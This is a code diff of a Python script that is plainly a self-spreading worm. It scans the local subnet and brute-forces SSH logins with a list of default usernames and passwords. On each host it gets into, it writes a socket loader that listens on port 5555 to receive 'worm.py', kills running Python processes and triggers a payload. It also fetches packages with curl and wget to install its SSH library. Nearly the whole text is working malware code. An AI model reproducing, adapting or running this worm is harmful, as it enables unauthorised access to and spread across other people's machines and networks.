@@ -14,8 +14,6 @@ try:
 except:
     from subprocess import PIPE as pipe
 import random
-
-
 try:
     import paramiko
 except:
@@ -29,42 +27,25 @@ except:
     except:
         os.system("curl https://files.pythonhosted.org/packages/cf/ae/94e70d49044ccc234bfdba20114fa947d7ba6eb68a2e452d89b920e62227/paramiko-2.4.2-py2.py3-none-any.whl -o paramiko-2.4.2-py2.py3-none-any.whl")
         os.system("curl https://files.pythonhosted.org/packages/0f/74/ecd13431bcc456ed390b44c8a6e917c1820365cbebcb6a8974d1cd045ab4/pip-10.0.1-py2.py3-none-any.whl -o pip-10.0.1-py2.py3-none-any.whl")
-
         os.system("wget https://files.pythonhosted.org/packages/0f/74/ecd13431bcc456ed390b44c8a6e917c1820365cbebcb6a8974d1cd045ab4/pip-10.0.1-py2.py3-none-any.whl") #Download the pip wheel
         os.system("wget https://files.pythonhosted.org/packages/cf/ae/94e70d49044ccc234bfdba20114fa947d7ba6eb68a2e452d89b920e62227/paramiko-2.4.2-py2.py3-none-any.whl")
-
-
         os.system("python pip-10.0.1-py2.py3-none-any.whl/pip install paramiko-2.4.2-py2.py3-none-any.whl")
         try:
             import paramiko
         except:
             os.system("echo Bailing out. System marked not-vulnerable. > bailed.txt")
             payload()
-
 def getips():
     addrs = []    
     addrs.append([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
     return addrs
-
-def ping(host):
-    ping = Popen(["ping","-c","1","-W","1",host],stdout=pipe,stderr=pipe)
-
-    out, err = ping.communicate()
-
-    if "0 received" in out or "0 received" in err:
-        return 1
-    elif "1 received" in out or "1 received" in err:
-        return 0
-
 subnet = []
 for ip in getips():
     ip = ip.split(".")[:3]
     ip = ip[0]+"."+ip[1]+"."+ip[2]+"."
     for i in range(1,256):
         subnet.append(ip+str(i))
-
 random.shuffle(subnet)
-
 hackable = []
 for i in subnet:
     connect = socket.socket()
@@ -77,15 +58,12 @@ for i in subnet:
     else:
         print("Our high hopes for {} were shattered.".format(i))
         subnet.remove(i)
-
 done = "E"+"O"+"F"
-
 loader = """import socket
 s = socket.socket()
 s.bind(("0.0.0.0",5555))
 s.listen(5)
 c,a = s.accept()
-
 while True:
     f = open("worm.py","ab")
     data = c.recv(4096)
@@ -97,7 +75,6 @@ while True:
         break
     f.close()
 """
-
 usernames = ["admin","root","guest"]
 passwords = ["toor","admin","root","guest","password","letmein"]
 for host in hackable:
@@ -133,14 +110,12 @@ for host in hackable:
             ssh.close()
             print("{} is already infected and/or has been noted to be non-vulnerable.".format(host))
             continue
-        
         a,b,c=ssh.exec_command("touch loader.py")
         b.readlines()
         for line in loader.splitlines():
             string = "echo \'{}\' >> loader.py".format(line)
             a,b,c = ssh.exec_command(string)
             b.readlines()
-
         a,b,c = ssh.exec_command("pkill python")
         b.readlines()
         a,b,c = ssh.exec_command("python loader.py")
@@ -159,4 +134,3 @@ for host in hackable:
         continue
 print("Done")
 payload()
-
